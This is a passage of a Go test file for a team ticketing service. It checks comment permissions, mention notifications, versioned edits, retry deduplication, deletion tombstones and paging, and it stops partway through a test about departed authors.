package service

import (
	"database/sql"
	"fmt"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"devboard/internal/team/domain"
	"devboard/internal/team/store"
)

// ---- helpers: a conversation between Ada (the project's owner), Bo and Cy (members) and Di (a reviewer) ----

func txt(s string) domain.Segment { return domain.Segment{Type: domain.SegmentText, Text: s} }
func at(a Actor) domain.Segment {
	return domain.Segment{Type: domain.SegmentMention, MemberID: a.Member.ID}
}

var commentCounter atomic.Int64

// say posts a comment as a, under a creation id of its own.
func (tm *team) say(a Actor, k domain.Ticket, parts ...domain.Segment) CommentView {
	tm.t.Helper()
	c, created, err := tm.svc.PostComment(bg, a, tm.pid(), k.ID, CommentInput{ClientID: fmt.Sprintf("client-%06d", commentCounter.Add(1)), Segments: parts})
	if err != nil || !created {
		tm.t.Fatalf("%s could not comment: created=%v %v", a.Member.Name, created, err)
	}
	return c
}

func (tm *team) comments(a Actor, k domain.Ticket, q CommentListQuery) CommentList {
	tm.t.Helper()
	l, err := tm.svc.ListComments(bg, a, tm.pid(), k.ID, q)
	if err != nil {
		tm.t.Fatalf("%s could not read the comments: %v", a.Member.Name, err)
	}
	return l
}

func (tm *team) inbox(a Actor) NotificationList {
	tm.t.Helper()
	l, err := tm.svc.ListNotifications(bg, a, NotificationListQuery{})
	if err != nil {
		tm.t.Fatalf("%s could not list notifications: %v", a.Member.Name, err)
	}
	return l
}

func (tm *team) unread(a Actor) int { return tm.inbox(a).Unread }

func (tm *team) edit(a Actor, c CommentView, parts ...domain.Segment) (CommentView, error) {
	return tm.svc.EditComment(bg, a, tm.pid(), c.TicketID, c.ID, c.Version, parts)
}

func (tm *team) workspaceRevision(a Actor) int64 {
	tm.t.Helper()
	r, err := tm.svc.WaitForWorkspaceChange(bg, a, 0, -1, 0)
	if err != nil {
		tm.t.Fatal(err)
	}
	return r.Revision
}

func (tm *team) projectRevision(a Actor) int64 {
	tm.t.Helper()
	p, err := tm.svc.GetProject(bg, a, tm.pid())
	if err != nil {
		tm.t.Fatal(err)
	}
	return p.Revision
}

func plain(c CommentView) string {
	return domain.PlainText(c.Segments)
}

// ---- who may comment ----

func TestMembersTalkOnATicketInOrderWithTheirNames(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Checkout", domain.TicketAvailable)
	first := tm.say(tm.bo, k, txt("Where do we start?"))
	second := tm.say(tm.owner, k, txt("With "), at(tm.cy), txt(" and the tests."))
	l := tm.comments(tm.cy, k, CommentListQuery{})
	if len(l.Comments) != 2 || l.Total != 2 || l.HasOlder || l.HasNewer {
		t.Fatalf("the conversation: %+v", l)
	}
	if l.Comments[0].ID != first.ID || l.Comments[1].ID != second.ID || l.Comments[0].Seq != 1 || l.Comments[1].Seq != 2 {
		t.Fatalf("not in the order they were posted: %+v", l.Comments)
	}
	got := l.Comments[1]
	if got.AuthorName != "Ada" || got.AuthorID != tm.owner.Member.ID || plain(got) != "With @Cy and the tests." || got.Version != 1 || got.EditedAt != nil || got.Deleted() {
		t.Fatalf("a comment as read: %+v", got)
	}
	if !got.MentionsMe || got.Notification == nil || got.Notification.Read || l.UnreadMentions != 1 {
		t.Fatalf("Cy was mentioned: %+v unread=%d", got, l.UnreadMentions)
	}
	if l.Comments[0].MentionsMe || l.Comments[0].Notification != nil {
		t.Errorf("a comment that mentions nobody is addressed to Cy: %+v", l.Comments[0])
	}
	// What each viewer may do to Bo's first comment: its author both; the project's owner delete only, never edit another's words.
	for _, c := range []struct {
		who                  Actor
		wantEdit, wantDelete bool
	}{{tm.cy, false, false}, {tm.bo, true, true}, {tm.owner, false, true}} {
		view := tm.comments(c.who, k, CommentListQuery{}).Comments[0]
		if view.CanEdit != c.wantEdit || view.CanDelete != c.wantDelete {
			t.Errorf("%s on Bo's comment: edit=%v delete=%v", c.who.Member.Name, view.CanEdit, view.CanDelete)
		}
	}
}

func TestOnlyPeopleWithAccessToTheProjectCanReadOrWriteItsConversation(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Private", domain.TicketAvailable)
	c := tm.say(tm.bo, k, txt("secret plans"))
	eve, _ := tm.member(tm.owner, "Eve") // in the workspace, not on the project
	other := tm.world.project(tm.owner, "Other")
	for name, err := range map[string]error{
		"list": func() error { _, err := tm.svc.ListComments(bg, eve, tm.pid(), k.ID, CommentListQuery{}); return err }(),
		"post": func() error {
			_, _, err := tm.svc.PostComment(bg, eve, tm.pid(), k.ID, CommentInput{ClientID: "client-eve-01", Segments: []domain.Segment{txt("hi")}})
			return err
		}(),
		"edit": func() error {
			_, err := tm.svc.EditComment(bg, eve, tm.pid(), k.ID, c.ID, 1, []domain.Segment{txt("hi")})
			return err
		}(),
		"delete": func() error { _, err := tm.svc.DeleteComment(bg, eve, tm.pid(), k.ID, c.ID, nil); return err }(),
	} {
		wantErr(t, err, domain.ErrNotFound)
		_ = name
	}
	// A ticket of one project is not reachable through another.
	_, err := tm.svc.ListComments(bg, tm.owner, other.ID, k.ID, CommentListQuery{})
	wantErr(t, err, domain.ErrNotFound)
	// Another workspace's owner cannot see it either.
	stranger, _ := tm.world.workspace("Rival", "Rex")
	_, err = tm.svc.ListComments(bg, stranger, tm.pid(), k.ID, CommentListQuery{})
	wantErr(t, err, domain.ErrNotFound)
	// A comment id of another ticket is not found on this one.
	k2 := tm.ticket(tm.owner, "Elsewhere", domain.TicketAvailable)
	_, err = tm.svc.EditComment(bg, tm.bo, tm.pid(), k2.ID, c.ID, 1, []domain.Segment{txt("hi")})
	wantErr(t, err, domain.ErrNotFound)
	_, err = tm.svc.DeleteComment(bg, tm.owner, tm.pid(), k2.ID, c.ID, nil)
	wantErr(t, err, domain.ErrNotFound)
	_, err = tm.svc.ListComments(bg, tm.owner, tm.pid(), k2.ID, CommentListQuery{Around: c.ID})
	wantErr(t, err, domain.ErrNotFound)
	// The workspace's owner may take part in a project they are not on, as they may do everything else there.
	if err := tm.svc.RemoveProjectMember(bg, tm.owner, tm.pid(), tm.owner.Member.ID); err != nil {
		t.Fatal(err)
	}
	if _, _, err := tm.svc.PostComment(bg, tm.owner, tm.pid(), k.ID, CommentInput{ClientID: "client-owner-01", Segments: []domain.Segment{txt("from outside the project")}}); err != nil {
		t.Errorf("the workspace's owner could not comment on a project they are not on: %v", err)
	}
}

func TestACommentNeedsTheRightToComment(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Look only", domain.TicketAvailable)
	// A person on the project whose role is not one of ours may do nothing there, comments included; seeing a ticket and
	// writing about it are two permissions (tickets.view, comments.post), which no role has one of without the other today.
	viewer, _ := tm.member(tm.owner, "Vi")
	if err := tm.db.Update(bg, func(tx store.Tx) error {
		return tx.AddProjectMember(bg, tm.owner.Workspace.ID, domain.ProjectMember{ProjectID: tm.pid(), MemberID: viewer.Member.ID, Role: "viewer", AddedBy: tm.owner.Member.ID, AddedAt: time.Now()})
	}); err != nil {
		t.Fatal(err)
	}
	_, err := tm.svc.ListComments(bg, viewer, tm.pid(), k.ID, CommentListQuery{})
	wantErr(t, err, domain.ErrForbidden)
	_, _, err = tm.svc.PostComment(bg, viewer, tm.pid(), k.ID, CommentInput{ClientID: "client-vi-0001", Segments: []domain.Segment{txt("hello")}})
	wantErr(t, err, domain.ErrForbidden)
	if domain.PPCommentsPost == domain.PPTicketsView {
		t.Fatal("seeing and commenting are the same permission")
	}
	for _, role := range []domain.ProjectRole{domain.ProjectOwner, domain.ProjectReviewer, domain.ProjectContributor} {
		if !role.Can(domain.PPCommentsPost) {
			t.Errorf("%s cannot comment", role)
		}
	}
}

// ---- mentions: who may be mentioned, and who is told ----

func TestOnlyPeopleOnTheProjectCanBeMentioned(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Mentions", domain.TicketAvailable)
	eve, _ := tm.member(tm.owner, "Eve") // in the workspace, not on the project
	post := func(parts ...domain.Segment) error {
		_, _, err := tm.svc.PostComment(bg, tm.bo, tm.pid(), k.ID, CommentInput{ClientID: fmt.Sprintf("client-%06d", commentCounter.Add(1)), Segments: parts})
		return err
	}
	wantErr(t, post(txt("cc "), at(eve)), domain.ErrInvalid)
	wantErr(t, post(txt("cc "), domain.Segment{Type: domain.SegmentMention, MemberID: "tmb_nobody"}), domain.ErrInvalid)
	wantErr(t, post(txt("cc "), domain.Segment{Type: domain.SegmentMention}), domain.ErrInvalid)
	// Somebody of another workspace, by their id, is nobody.
	stranger, _ := tm.world.workspace("Rival", "Rex")
	wantErr(t, post(txt("cc "), at(stranger)), domain.ErrInvalid)
	if tm.unread(eve) != 0 || tm.unread(stranger) != 0 {
		t.Error("a refused comment notified someone")
	}
	// Once Eve is on the project she can be.
	if err := tm.svc.AddProjectMember(bg, tm.owner, tm.pid(), eve.Member.ID, ""); err != nil {
		t.Fatal(err)
	}
	if err := post(txt("cc "), at(eve)); err != nil {
		t.Fatal(err)
	}
	if tm.unread(eve) != 1 {
		t.Error("Eve was not told")
	}
	// And not any more when she leaves.
	if err := tm.svc.RemoveProjectMember(bg, tm.owner, tm.pid(), eve.Member.ID); err != nil {
		t.Fatal(err)
	}
	wantErr(t, post(txt("cc "), at(eve)), domain.ErrInvalid)
}

func TestOnlyAMentionMakesANotificationAndOnlyOnePerPerson(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Who is told", domain.TicketAvailable)
	tm.say(tm.owner, k, txt("Nobody is mentioned here, though Bo and Cy are on this project."))
	tm.say(tm.owner, k, txt("Bo@Cy: not a mention either"))
	if tm.unread(tm.bo) != 0 || tm.unread(tm.cy) != 0 || tm.unread(tm.di) != 0 {
		t.Fatalf("a comment without a mention notified someone: %d %d %d", tm.unread(tm.bo), tm.unread(tm.cy), tm.unread(tm.di))
	}
	// Several people, one of them three times, and the author themselves.
	c := tm.say(tm.owner, k, at(tm.bo), txt(", "), at(tm.cy), txt(" and again "), at(tm.bo), txt(" and "), at(tm.bo), txt(" and me "), at(tm.owner))
	if tm.unread(tm.bo) != 1 || tm.unread(tm.cy) != 1 || tm.unread(tm.owner) != 0 || tm.unread(tm.di) != 0 {
		t.Fatalf("recipients: bo=%d cy=%d ada=%d di=%d", tm.unread(tm.bo), tm.unread(tm.cy), tm.unread(tm.owner), tm.unread(tm.di))
	}
	for _, a := range []Actor{tm.bo, tm.cy} {
		items := tm.inbox(a).Notifications
		if len(items) != 1 || items[0].CommentID != c.ID || items[0].AuthorName != "Ada" || items[0].TicketKey != k.Key || items[0].ProjectName != "Shop" ||
			items[0].TicketTitle != "Who is told" || !strings.HasPrefix(items[0].Excerpt, "@Bo, @Cy and again @Bo") {
			t.Errorf("%s's notification: %+v", a.Member.Name, items)
		}
	}
	// The mention of oneself stays in the comment, as a mention.
	if got := tm.comments(tm.owner, k, CommentListQuery{}).Comments[2]; !got.MentionsMe || got.Notification != nil {
		t.Errorf("a self-mention: mentionsMe=%v notification=%v (it is highlighted, and has nothing to mark read)", got.MentionsMe, got.Notification)
	}
	// Each person's notifications are theirs alone.
	for _, a := range []Actor{tm.bo, tm.cy} {
		for _, n := range tm.inbox(a).Notifications {
			other := tm.bo
			if a.Member.ID == tm.bo.Member.ID {
				other = tm.cy
			}
			if _, err := tm.svc.MarkNotificationRead(bg, other, n.ID); err == nil {
				t.Errorf("%s marked %s's notification read", other.Member.Name, a.Member.Name)
			} else {
				wantErr(t, err, domain.ErrNotFound)
			}
		}
	}
	if tm.unread(tm.bo) != 1 || tm.unread(tm.cy) != 1 {
		t.Error("somebody else's marking changed a person's count")
	}
}

func TestEditingChangesWhoIsToldExactlyOnce(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Edits", domain.TicketAvailable)
	c := tm.say(tm.owner, k, txt("first thoughts, "), at(tm.bo))
	n := tm.inbox(tm.bo).Notifications[0]
	if _, err := tm.svc.MarkNotificationRead(bg, tm.bo, n.ID); err != nil {
		t.Fatal(err)
	}

	// An edit that does not touch the mention does not open Bo's read notification again.
	c, err := tm.edit(tm.owner, c, txt("second thoughts, "), at(tm.bo), txt(" please look"))
	if err != nil {
		t.Fatal(err)
	}
	if c.Version != 2 || c.EditedAt == nil || plain(c) != "second thoughts, @Bo please look" {
		t.Fatalf("the edit: %+v", c)
	}
	if tm.unread(tm.bo) != 0 {
		t.Fatal("an unrelated edit reopened a read notification")
	}
	// An edit that adds Cy tells Cy, once; editing again with Cy still there does not tell Cy a second time.
	c, err = tm.edit(tm.owner, c, txt("second thoughts, "), at(tm.bo), txt(" and "), at(tm.cy))
	if err != nil {
		t.Fatal(err)
	}
	if tm.unread(tm.cy) != 1 || tm.unread(tm.bo) != 0 {
		t.Fatalf("after adding Cy: cy=%d bo=%d", tm.unread(tm.cy), tm.unread(tm.bo))
	}
	cyN := tm.inbox(tm.cy).Notifications[0]
	if _, err := tm.svc.MarkNotificationRead(bg, tm.cy, cyN.ID); err != nil {
		t.Fatal(err)
	}
	if c, err = tm.edit(tm.owner, c, txt("rewritten, "), at(tm.cy), txt(" is on it, and "), at(tm.bo)); err != nil {
		t.Fatal(err)
	}
	if tm.unread(tm.cy) != 0 || tm.unread(tm.bo) != 0 {
		t.Fatalf("an edit that kept the mentions told them again: cy=%d bo=%d", tm.unread(tm.cy), tm.unread(tm.bo))
	}
	// Taking Bo's mention out takes the notification away, read or not; taking Cy's out likewise.
	unreadBefore := tm.unread(tm.bo)
	if c, err = tm.edit(tm.owner, c, txt("rewritten, "), at(tm.cy), txt(" is on it")); err != nil {
		t.Fatal(err)
	}
	items := func(a Actor, all bool) int {
		l, err := tm.svc.ListNotifications(bg, a, NotificationListQuery{IncludeRead: all})
		if err != nil {
			t.Fatal(err)
		}
		return len(l.Notifications)
	}
	if items(tm.bo, true) != 0 || unreadBefore != 0 {
		t.Fatalf("Bo still has a notification of a mention that was taken out (%d)", items(tm.bo, true))
	}
	if items(tm.cy, true) != 1 {
		t.Fatalf("Cy lost theirs by another's mention being taken out")
	}
	// Putting Bo's mention back tells Bo again, as new: it was a different mention.
	if c, err = tm.edit(tm.owner, c, txt("rewritten, "), at(tm.cy), txt(" is on it, "), at(tm.bo)); err != nil {
		t.Fatal(err)
	}
	if tm.unread(tm.bo) != 1 {
		t.Fatalf("a mention put back did not reach Bo: %d", tm.unread(tm.bo))
	}
	// Mentioning the author does nothing; an edit that mentions nobody takes every notification away.
	if c, err = tm.edit(tm.owner, c, txt("just me "), at(tm.owner)); err != nil {
		t.Fatal(err)
	}
	if tm.unread(tm.bo) != 0 || items(tm.cy, true) != 0 {
		t.Fatal("a comment with nobody in it still notifies")
	}
	// The same words again are not an edit.
	same, err := tm.edit(tm.owner, c, txt("just me "), at(tm.owner))
	if err != nil || same.Version != c.Version || !same.EditedAt.Equal(*c.EditedAt) {
		t.Fatalf("saving the same words made a new version: %+v %v", same, err)
	}
}

func TestOnlyTheAuthorEditsAndAnEditNeedsTheLatestVersion(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Conflicts", domain.TicketAvailable)
	c := tm.say(tm.bo, k, txt("original"))
	// Not even the project's owner edits another person's words.
	_, err := tm.edit(tm.owner, c, txt("rewritten by the boss"))
	wantErr(t, err, domain.ErrForbidden)
	_, err = tm.edit(tm.cy, c, txt("rewritten by Cy"))
	wantErr(t, err, domain.ErrForbidden)
	// A stale version is refused and nothing changes; the right one is accepted.
	_, err = tm.svc.EditComment(bg, tm.bo, tm.pid(), k.ID, c.ID, c.Version+1, []domain.Segment{txt("from the future")})
	wantErr(t, err, domain.ErrConflict)
	got, err := tm.edit(tm.bo, c, txt("fixed typo"))
	if err != nil || got.Version != 2 {
		t.Fatalf("%+v %v", got, err)
	}
	_, err = tm.edit(tm.bo, c, txt("from another tab, with the old version"))
	wantErr(t, err, domain.ErrConflict)
	if now := tm.comments(tm.bo, k, CommentListQuery{}).Comments[0]; plain(now) != "fixed typo" || now.Version != 2 {
		t.Fatalf("the conflicting edit changed it: %+v", now)
	}
	// Empty and over-long edits are refused.
	_, err = tm.edit(tm.bo, got, txt("  "))
	wantErr(t, err, domain.ErrInvalid)
	_, err = tm.edit(tm.bo, got, txt(strings.Repeat("x", domain.MaxCommentLen+1)))
	wantErr(t, err, domain.ErrInvalid)
	// An edit to a version of nothing.
	_, err = tm.svc.EditComment(bg, tm.bo, tm.pid(), k.ID, "tcm_nothing", 1, []domain.Segment{txt("x")})
	wantErr(t, err, domain.ErrNotFound)
}

func TestTwoEditsOfTheSameVersionAtOnceHaveOneWinner(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Race", domain.TicketAvailable)
	c := tm.say(tm.bo, k, txt("original"))
	var wins, conflicts atomic.Int64
	var wg sync.WaitGroup
	for i := 0; i < 6; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, err := tm.svc.EditComment(bg, tm.bo, tm.pid(), k.ID, c.ID, 1, []domain.Segment{txt(fmt.Sprintf("version from tab %d", i))})
			switch {
			case err == nil:
				wins.Add(1)
			case isConflict(err):
				conflicts.Add(1)
			default:
				t.Errorf("edit %d: %v", i, err)
			}
		}()
	}
	wg.Wait()
	if wins.Load() != 1 || conflicts.Load() != 5 {
		t.Fatalf("%d edits won and %d conflicted: exactly one may win", wins.Load(), conflicts.Load())
	}
	if got := tm.comments(tm.bo, k, CommentListQuery{}).Comments[0]; got.Version != 2 {
		t.Fatalf("version %d", got.Version)
	}
}

// ---- retries ----

func TestPostingTheSameCommentAgainIsOneComment(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Retries", domain.TicketAvailable)
	parts := []domain.Segment{txt("please look, "), at(tm.bo)}
	first, created, err := tm.svc.PostComment(bg, tm.owner, tm.pid(), k.ID, CommentInput{ClientID: "client-retry-1", Segments: parts})
	if err != nil || !created {
		t.Fatal(created, err)
	}
	for i := 0; i < 3; i++ { // the client did not hear the answer, and asks again
		again, created, err := tm.svc.PostComment(bg, tm.owner, tm.pid(), k.ID, CommentInput{ClientID: "client-retry-1", Segments: parts})
		if err != nil || created || again.ID != first.ID || again.Seq != first.Seq {
			t.Fatalf("retry %d: %+v created=%v %v", i, again, created, err)
		}
	}
	if l := tm.comments(tm.bo, k, CommentListQuery{}); len(l.Comments) != 1 || tm.unread(tm.bo) != 1 {
		t.Fatalf("the retries made %d comments and Bo has %d notifications", len(l.Comments), tm.unread(tm.bo))
	}
	// A retry after the author has since changed the comment finds it as it is now, and changes nothing.
	edited, err := tm.edit(tm.owner, first, txt("changed my mind, "), at(tm.bo))
	if err != nil {
		t.Fatal(err)
	}
	late, created, err := tm.svc.PostComment(bg, tm.owner, tm.pid(), k.ID, CommentInput{ClientID: "client-retry-1", Segments: parts})
	if err != nil || created || late.ID != first.ID || late.Version != edited.Version {
		t.Fatalf("a late retry: %+v created=%v %v", late, created, err)
	}
	// The same id with other words is a mistake, not a retry.
	_, _, err = tm.svc.PostComment(bg, tm.owner, tm.pid(), k.ID, CommentInput{ClientID: "client-retry-1", Segments: []domain.Segment{txt("something else")}})
	wantErr(t, err, domain.ErrConflict)
	// Another author may use the same id for their own comment, and so may the same author on another ticket.
	if _, created, err := tm.svc.PostComment(bg, tm.cy, tm.pid(), k.ID, CommentInput{ClientID: "client-retry-1", Segments: []domain.Segment{txt("me too")}}); err != nil || !created {
		t.Fatalf("another author: %v %v", created, err)
	}
	k2 := tm.ticket(tm.owner, "Another", domain.TicketAvailable)
	if _, created, err := tm.svc.PostComment(bg, tm.owner, tm.pid(), k2.ID, CommentInput{ClientID: "client-retry-1", Segments: []domain.Segment{txt("elsewhere")}}); err != nil || !created {
		t.Fatalf("another ticket: %v %v", created, err)
	}
	// A creation id has a shape.
	for _, bad := range []string{"", "short", strings.Repeat("x", 70), "with spaces here"} {
		_, _, err := tm.svc.PostComment(bg, tm.owner, tm.pid(), k.ID, CommentInput{ClientID: bad, Segments: parts})
		wantErr(t, err, domain.ErrInvalid)
	}
}

func TestPostingAtOnceUnderOneCreationIdMakesOneComment(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Double click", domain.TicketAvailable)
	var created, replays atomic.Int64
	var wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, c, err := func() (CommentView, bool, error) {
				return tm.svc.PostComment(bg, tm.owner, tm.pid(), k.ID, CommentInput{ClientID: "client-double", Segments: []domain.Segment{txt("sent "), at(tm.bo)}})
			}()
			switch {
			case err != nil:
				t.Errorf("post %d: %v", i, err)
			case c:
				created.Add(1)
			default:
				replays.Add(1)
			}
		}()
	}
	wg.Wait()
	if created.Load() != 1 || replays.Load() != 7 {
		t.Fatalf("%d created and %d replays", created.Load(), replays.Load())
	}
	if l := tm.comments(tm.owner, k, CommentListQuery{}); len(l.Comments) != 1 || tm.unread(tm.bo) != 1 {
		t.Fatalf("%d comments, %d notifications", len(l.Comments), tm.unread(tm.bo))
	}
}

// ---- deleting ----

func TestDeletingCommentsLeavesTombstonesAndWithdrawsNotifications(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Deletions", domain.TicketAvailable)
	mine := tm.say(tm.bo, k, txt("my words "), at(tm.cy))
	theirs := tm.say(tm.cy, k, txt("their words "), at(tm.bo))
	keep := tm.say(tm.bo, k, txt("still here"))
	if tm.unread(tm.cy) != 1 || tm.unread(tm.bo) != 1 {
		t.Fatal("setup")
	}
	// A member deletes their own; it becomes a tombstone in the same place, with nothing of what it said.
	got, err := tm.svc.DeleteComment(bg, tm.bo, tm.pid(), k.ID, mine.ID, nil)
	if err != nil || !got.Deleted() || got.DeletedBy != domain.DeletedByAuthor || len(got.Segments) != 0 || got.Seq != mine.Seq || got.Version != 2 || got.CanEdit || got.CanDelete {
		t.Fatalf("tombstone: %+v %v", got, err)
	}
	if tm.unread(tm.cy) != 0 {
		t.Error("deleting the comment left its notification")
	}
	// A member cannot delete another's; the project's owner can, and the tombstone says a manager did.
	_, err = tm.svc.DeleteComment(bg, tm.bo, tm.pid(), k.ID, theirs.ID, nil)
	wantErr(t, err, domain.ErrForbidden)
	_, err = tm.svc.DeleteComment(bg, tm.di, tm.pid(), k.ID, theirs.ID, nil) // a reviewer is not a manager
	wantErr(t, err, domain.ErrForbidden)
	got, err = tm.svc.DeleteComment(bg, tm.owner, tm.pid(), k.ID, theirs.ID, nil)
	if err != nil || got.DeletedBy != domain.DeletedByManager || got.AuthorName != "Cy" {
		t.Fatalf("a manager's deletion: %+v %v", got, err)
	}
	if tm.unread(tm.bo) != 0 {
		t.Error("a manager's deletion left the notification")
	}
	// Deleting again is a no-op that returns the tombstone, whoever asks, whatever version they have.
	stale := int64(1)
	again, err := tm.svc.DeleteComment(bg, tm.owner, tm.pid(), k.ID, theirs.ID, &stale)
	if err != nil || !again.Deleted() || again.Version != got.Version {
		t.Fatalf("deleting a tombstone: %+v %v", again, err)
	}
	// The tombstones keep the order, and the total counts what is left.
	l := tm.comments(tm.owner, k, CommentListQuery{})
	if len(l.Comments) != 3 || l.Total != 1 || !l.Comments[0].Deleted() || !l.Comments[1].Deleted() || l.Comments[2].ID != keep.ID {
		t.Fatalf("the conversation after deleting: %+v", l)
	}
	// A deleted comment can no longer be edited, and what was in it is nowhere in what is read back.
	_, err = tm.edit(tm.bo, mine, txt("resurrected"))
	wantErr(t, err, domain.ErrConflict)
	// A stale version refuses a deletion that would have thrown away somebody's edit.
	c := tm.say(tm.bo, k, txt("v1"))
	edited, _ := tm.edit(tm.bo, c, txt("v2"))
	old := c.Version
	_, err = tm.svc.DeleteComment(bg, tm.bo, tm.pid(), k.ID, c.ID, &old)
	wantErr(t, err, domain.ErrConflict)
	fresh := edited.Version
	if _, err := tm.svc.DeleteComment(bg, tm.bo, tm.pid(), k.ID, c.ID, &fresh); err != nil {
		t.Fatal(err)
	}
	// Nothing of what a deleted comment said is read back, by anyone.
	for _, who := range []Actor{tm.bo, tm.cy, tm.owner} {
		for _, c := range tm.comments(who, k, CommentListQuery{}).Comments {
			if c.Deleted() && (len(c.Segments) != 0 || plain(c) != "") {
				t.Errorf("%s reads %q of a deleted comment", who.Member.Name, plain(c))
			}
		}
	}
}

// ---- reading it in pages ----

func TestACommentThreadIsReadInPagesAndAroundOneComment(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Long thread", domain.TicketAvailable)
	var all []CommentView
	for i := 0; i < 30; i++ {
		all = append(all, tm.say(tm.bo, k, txt(fmt.Sprintf("message %02d", i+1))))
	}
	ids := func(l CommentList) (out []int64) {
		for _, c := range l.Comments {
			out = append(out, c.Seq)
		}
		return out
	}
	seqRange := func(from, to int64) (out []int64) {
		for i := from; i <= to; i++ {
			out = append(out, i)
		}
		return out
	}
	eq := func(a, b []int64) bool { return fmt.Sprint(a) == fmt.Sprint(b) }

	latest := tm.comments(tm.cy, k, CommentListQuery{Limit: 10})
	if !eq(ids(latest), seqRange(21, 30)) || !latest.HasOlder || latest.HasNewer || latest.Total != 30 || latest.OlderBefore != 21 || latest.NewerAfter != 30 {
		t.Fatalf("latest: %v %+v", ids(latest), latest)
	}
	older := tm.comments(tm.cy, k, CommentListQuery{Limit: 10, Before: latest.OlderBefore})
	if !eq(ids(older), seqRange(11, 20)) || !older.HasOlder || !older.HasNewer {
		t.Fatalf("before: %v", ids(older))
	}
	oldest := tm.comments(tm.cy, k, CommentListQuery{Limit: 10, Before: older.OlderBefore})
	if !eq(ids(oldest), seqRange(1, 10)) || oldest.HasOlder || !oldest.HasNewer {
		t.Fatalf("oldest: %v", ids(oldest))
	}
	newer := tm.comments(tm.cy, k, CommentListQuery{Limit: 10, After: 25, HasAfter: true})
	if !eq(ids(newer), seqRange(26, 30)) || !newer.HasOlder || newer.HasNewer {
		t.Fatalf("after: %v", ids(newer))
	}
	// From the very start: after position 0, which is a place and not "no place".
	if first := tm.comments(tm.cy, k, CommentListQuery{Limit: 10, After: 0, HasAfter: true}); !eq(ids(first), seqRange(1, 10)) || first.HasOlder || !first.HasNewer {
		t.Fatalf("after 0: %v", ids(first))
	}
	// Around a comment: it is in the page, flagged as the one to show, with company on both sides.
	around := tm.comments(tm.cy, k, CommentListQuery{Limit: 7, Around: all[14].ID})
	if around.Focus != all[14].ID || !eq(ids(around), seqRange(12, 18)) || !around.HasOlder || !around.HasNewer {
		t.Fatalf("around: %v focus=%s", ids(around), around.Focus)
	}
	if edge := tm.comments(tm.cy, k, CommentListQuery{Limit: 7, Around: all[0].ID}); !eq(ids(edge), seqRange(1, 7)) || edge.HasOlder {
		t.Fatalf("around the first: %v", ids(edge))
	}
	// Limits are bounded, and the ways to ask do not mix.
	if big := tm.comments(tm.cy, k, CommentListQuery{Limit: 100000}); len(big.Comments) != 30 {
		t.Fatalf("a large limit: %d", len(big.Comments))
	}
	for _, q := range []CommentListQuery{{Before: 5, After: 3, HasAfter: true}, {Around: all[0].ID, Before: 5}, {Around: all[0].ID, After: 1, HasAfter: true}, {Around: all[0].ID, HasAfter: true}, {Before: -1}, {After: -1, HasAfter: true}, {Limit: -1}} {
		_, err := tm.svc.ListComments(bg, tm.cy, tm.pid(), k.ID, q)
		wantErr(t, err, domain.ErrInvalid)
	}
	// A page does not leak the viewer's notification state into someone else's reading.
	tm.say(tm.owner, k, txt("for Cy "), at(tm.cy))
	if tm.comments(tm.cy, k, CommentListQuery{Limit: 1}).Comments[0].Notification == nil || tm.comments(tm.bo, k, CommentListQuery{Limit: 1}).Comments[0].Notification != nil {
		t.Error("a notification is on a comment for someone it is not for")
	}
}

// ---- names ----

func TestAMentionIsBoundToThePersonAndNotTheirName(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Two Alexes", domain.TicketAvailable)
	alex, _ := tm.member(tm.owner, "Alex")
	if err := tm.svc.AddProjectMember(bg, tm.owner, tm.pid(), alex.Member.ID, ""); err != nil {
		t.Fatal(err)
	}
	c := tm.say(tm.owner, k, txt("Thanks "), at(alex), txt(" for the patch"), at(tm.bo))
	// Alex leaves and, later, another person is given the same name.
	if err := tm.svc.RemoveMember(bg, tm.owner, alex.Member.ID); err != nil {
		t.Fatal(err)
	}
	alexTwo, _ := tm.member(tm.owner, "Alex")
	if err := tm.svc.AddProjectMember(bg, tm.owner, tm.pid(), alexTwo.Member.ID, ""); err != nil {
		t.Fatal(err)
	}
	got := tm.comments(tm.cy, k, CommentListQuery{}).Comments[0]
	if got.ID != c.ID || got.Segments[1].MemberID != alex.Member.ID || got.Segments[1].Name != "Alex" {
		t.Fatalf("the mention of the first Alex: %+v", got.Segments)
	}
	if mine := tm.comments(alexTwo, k, CommentListQuery{}).Comments[0]; mine.MentionsMe || mine.Notification != nil {
		t.Errorf("the new Alex was taken for the old one: %+v", mine)
	}
	if tm.unread(alexTwo) != 0 {
		t.Error("the new Alex was notified of a comment that is not about them")
	}
	// The new one is told of their own mention, which is another mention.
	d := tm.say(tm.owner, k, at(alexTwo), txt(" can you review?"))
	if tm.unread(alexTwo) != 1 || tm.inbox(alexTwo).Notifications[0].CommentID != d.ID {
		t.Error("the new Alex is not told of their own mention")
	}
}

func TestTheAuthorOfACommentIsRememberedWhenTheyLeave(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "History", domain.TicketAvailable)
	leaver, _ := tm.member(tm.owner, "Lee")
	if err := tm.svc.AddProjectMember(bg, tm.owner, tm.pid(), leaver.Member.ID, ""); err != nil {
		t.Fatal(err)
	}
	c := tm.say(leaver, k, txt("handing over to "), at(tm.bo))
	tm.say(tm.owner, k, txt("thanks "), at(leaver))
	if err := tm.svc.RemoveMember(bg, tm.owner, leaver.Member.ID); err != nil {
		t.Fatal(err)
	}
	l := tm.comments(tm.bo, k, CommentListQuery{})
	if len(l.Comments) != 2 {
